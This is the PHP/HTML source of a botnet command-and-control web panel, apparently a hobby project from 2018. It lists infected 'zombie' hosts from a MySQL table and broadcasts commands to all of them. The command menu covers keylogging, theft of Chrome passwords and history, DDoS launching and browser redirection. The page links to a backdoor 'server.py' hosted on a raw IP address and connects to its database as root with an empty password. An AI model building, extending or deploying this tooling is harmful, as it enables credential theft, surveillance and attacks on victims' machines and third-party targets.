<!DOCTYPE html>
<html>
<head>
	<title>Pythogen's Dashboard</title>

	<script src="js/jquery.min.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Teko" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="css/dash-style.css">
	<link rel="stylesheet" type="text/css" href="css/clistyles.css">
  <link rel="stylesheet" type="text/css" href="css/animate.css">
  <link rel="stylesheet" href="css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="css/w3.css">

</head>
<body>

<div class="w3-sidebar w3-bar-block w3-card w3-animate-left" style="display:none" id="mySidebar">
  <button class="w3-bar-item w3-button w3-large"
  onclick="side_close()">Close &times;</button>
  <a href="#" class="w3-bar-item w3-button">Main</a>
  <a href="#" onClick="alert('This backdoor service is private...\n\nThis tool is designed to view/monitor activity of infected hosts. It may look malicious, but this project is just for fun. There is no malicious intent behind this project. \n\nZombie Server Coded in Python\nWeb Dashboard Coded in HTML, CSS, JavaScript, JQuery\nData Storage/Communication - MySQL, PHP, AJAX, JSON\n\nBy Pythogen')" class="w3-bar-item w3-button">About</a>
  <a href="index.php" class="w3-bar-item w3-button">Logout</a>
</div>

<div id="main">

<div class="navColor">
  <img src="img/logo.png" class="logoSet">
  <button id="openNav" class="w3-button navColor w3-xlarge" onclick="side_open()">&#9776;</button>
  <div class="w3-container">
  </div>
</div>

<div class="w3-container">
<div class="dash">

<div class="typebody">
<div class="typewriter">
  <h1>Welcome to your private dashboard.</h1>
</div>
</div>

<div class="container-fluid">
<!--sql = SELECT * FROM my_table ORDER BY id_field DESC LIMIT 1"-->
	
	<div class="row">
		<div class="col-md-6 animated fadeInLeft">
			<h4>Zombie Table - <a title="Click Here to learn about 'Zombie Table'" onClick="alert('The backdoor servers(Zombies) send information to a specific MySQL table after initial execution(infection).\n\nZombie details are always listed here. The \'Zombie Table\' is updated after every infection and can be viewed via this panel.\n\nTable Name: hosts\nColumns: (ID, HostName, PCName, DateStamp');">[?]</a></h4>
			<div class="space1">
			<!-- Start Table Extraction -->
				<?php
				$servername = "localhost";
				$username = "root";
				$password = "";
				$dbname = "blackdoor";

				$conn = new mysqli($servername, $username, $password, $dbname);

				if ($conn->connect_error) {
				    die("Connection failed: " . $conn->connect_error);
				} 

				$sql = "SELECT ID, HostName, PCName, DateStamp FROM hosts";

				$result = $conn->query($sql);

				if ($result->num_rows > 0) {
				    while($row = $result->fetch_assoc()) {
				        echo "[" . $row["ID"] . "] - " . $row["HostName"]. " - " . $row["PCName"] . " - " . $row["DateStamp"] . "<br>";
				    }
				} else {
				    echo "No Zombies Online...";
				}

				$conn->close();
				?>
			<!-- End Table Extraction -->
			</div>
		</div>

    <div class="col-md-6 animated fadeInRight">
      <h4>Dashboard Tunes - <a title="Click Here to learn about 'Dashboard Tunes'" onClick="alert('Ain\'t nothing quite as beautiful as Music. \n- Eyedea');">[?]</a></h4>
      <script type="text/javascript">
      function getRandomInt(max) {
        return Math.floor(Math.random() * Math.floor(max));
      }
        var ranYT = getRandomInt(3);
        if (ranYT == 0)
          document.write('<div class="space1"><iframe width="100%" height="250" src="https://www.youtube.com/embed/eSjSozKL_EA?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe></div>');
        else if (ranYT == 1)
          document.write('<div class="space1"><iframe width="100%" height="250" src="https://www.youtube.com/embed/_w5ARZczA2E?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>');
        else if (ranYT == 2)
          document.write('<div class="space1"><iframe width="100%" height="250" src="https://www.youtube.com/embed/eTYcOQnJaSI?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>');
      </script>

    </div>

	</div>

	<div class="row">
		<div class="col-md-6 animated fadeInLeft">
		  <h4>Command - <a title="Click Here to learn about 'Command'" onClick="alert('This is the command terminal. Send commands to all zombies here.\n\nThis terminal will issue a POST request and insert data into a specific MySQL table used to communicate with the currently active backdoor servers(Zombies). The last table submission is displayed to your right under \'Previous Broadcast\'.\n\nTable Name: cmdhist\nTable Columns: (ID, CMD)');">[?]</a></h4>
			<div class="space2">
        <div class="cli">
          <div class="cli-body" ng-click="focusTextarea()">
            <p>
              <span class="dollar">$</span> Please enter a command (Online):
            </p>

            <div class="cli-control">
              <span class="dollar left">$</span>
              <input type="text" class="cli-input right" name="cli-input" autofocus>
            </div>
          </div>
        </div>
			</div>
		</div>

    <div class="col-md-6 animated fadeInRight">
      <h4>Previous Broadcast - <a title="Click Here to learn about 'Previous Broadcast'" onClick="alert('This is the previous command issued via \'Command\'. This entry is precisely what the executable backdoor server(Zombie) interprets and executes. \n\nThe Zombie views this entry(preserved in a MySQL table), then it waits for a submission update. The next command is executed after it is issued via \'Command\' and after it is included in the table.\n\nThe Zombie is always listening for new table submissions...');"> [?]</a></h4>
      <div class="space2">
        <p class="prevbroad" id="prevcmd" name="prev" title="All Zombies know to follow this instruction..."><?php
          $servername = "localhost";
          $username = "root";
          $password = "";
          $dbname = "blackdoor";

          $conn = new mysqli($servername, $username, $password, $dbname);

          if ($conn->connect_error) {
              die("Connection failed: " . $conn->connect_error);
          } 

          $sql2 = "SELECT * FROM cmdhist ORDER BY ID DESC LIMIT 1";
          $result2 = $conn->query($sql2);

          if ($result2->num_rows > 0) {
          while($row = $result2->fetch_assoc()) {
          echo $row["CMD"];
          }
          } else {
          echo "No Commands..";
          }

          $conn->close();
          ?></p>
      </div>
    </div>

	</div>

</div>
</div>
</div>

</div>

<!-- Left bar end -->

<footer>
  Coded by <a href="https://github.com/pythogen">Pythogen</a> - ©Copyright 2018
</footer>

</body>
</html>

<div class="css-typing"></div>

<!-- Download backdoor server then execute to populate Zombie Database -->
<div class="download animated fadeInUp">
  <a href="http://73.119.226.116/server_dir_147/server.py" title="View Unfinished Source Code"><img src="img/download.png" class="downloadClick"></a>
</div>

<!-- JQuery Self Typing Text Animation -->
<script type="text/javascript">

var str = 'This dashboard is still under construction. Type "help" for a list of commands.';

var spans = '<span>' + str.split('').join('</span><span>') + '</span>';
$(spans).hide().appendTo('.css-typing').each(function (i) {
    $(this).delay(50 * i).css({
        display: 'inline',
        opacity: 0
    }).animate({
        opacity: 1
    }, 100);
});

function side_open() {
  document.getElementById("main").style.marginLeft = "15%";
  document.getElementById("mySidebar").style.width = "15%";
  document.getElementById("mySidebar").style.display = "block";
  document.getElementById("openNav").style.display = 'none';
}
function side_close() {
  document.getElementById("main").style.marginLeft = "0%";
  document.getElementById("mySidebar").style.display = "none";
  document.getElementById("openNav").style.display = "inline-block";
}

  $(document).ready(function() {
  // Autofocus
  $('.cli-body').click(function() {
    $('.cli-input').focus();
  });

  // Text mockup
  $('.cli-input').on('change', function() {
    if($(this).val()=="help" || $(this).val()=="?")
    {
      $('.cli-control').before('<p class="success">= Commands =<br>keylog<br>alert(text)<br>open.cd<br>screenshot<br>navigate(url)<br>wallpaper(img)<br>history<br>passwords<br>processes<br></p>');
    }
    else if($(this).val()=="processes")
    {
      $('.cli-control').before('<p class="success">(Global) Extracting Windows Processes... <br></p>');
    }
    else if($(this).val()=="passwords")
    {
      $('.cli-control').before('<p class="success">(Global) Extracting Google Chrome Passwords... <br></p>');
    }
    else if($(this).val()=="history")
    {
      $('.cli-control').before('<p class="success">(Global) Extracting Google Chrome History... <br></p>');
    }
    else if($(this).val()=="open.cd")
    {
      $('.cli-control').before('<p class="success">(Global) CD Drive Open for all Zombies.<br></p>');
    }
    else if($(this).val()=="idle")
    {
      $('.cli-control').before('<p class="success">(Global) Idle state activated.<br></p>');
    }
    else if($(this).val()=="keylog")
    {
      $(".cli-control").before('<p class="success">(Global) Keylogger Started! Wait for output...</br></p>')
    }
    else if($(this).val()=="screenshot")
    {
      $(".cli-control").before('<p class="success">(Global) Feature not available yet.</br></p>')
    }
    else if($(this).val().indexOf("ddos") >= 0)
    {
      var newStr = $(this).val().substr(5);
      $('.cli-control').before('<p class="success">(Global) DDoS Attack Initiated on ' + newStr + '.<br></p>');
    }
    else if($(this).val().indexOf("navigate") >= 0)
    {
      var newStr = $(this).val().substr(9);
      $('.cli-control').before('<p class="success">(Global) Browser redirection Sucessful.<br></p>');
    }
    else if($(this).val().indexOf("alert") >= 0)
    {
      var newStr = $(this).val().substr(6);
      $('.cli-control').before('<p class="success">(Global) Alert Sent.<br></p>');
    }
    else if($(this).val().indexOf("wallpaper") >= 0)
    {
      var newStr = $(this).val().substr(10);
      $('.cli-control').before('<p class="success">(Global) Wallpaper set.<br></p>');
    }
    else
    {
      $('.cli-control').before('<p class="error"><span class="dollar">$</span> ' + $(this).val() + '</p>');
    }

    var conditional4Post = ($(this).val()=="processes" || $(this).val()=="passwords" || $(this).val()=="history" || $(this).val()=="open.cd" || $(this).val()=="idle" || $(this).val()=="keylog" || $(this).val()=="screenshot" || $(this).val().indexOf("ddos") >= 0 || $(this).val().indexOf("navigate") >= 0 || $(this).val().indexOf("alert") >= 0 || $(this).val().indexOf("wallpaper") >= 0);

    if(conditional4Post)
    {
      // AJAX + JSON to MySQL insert [Update CMDhist table]
      $.ajax({
                type: 'POST',
                url: '/insert.php',
                dataType:'json',
                data: ({cmdCatch: $(this).val()}),
                success: function(response) {
                    alert(response);
                }
            });
    }
    
    $(this).val('');
  });
});

</script>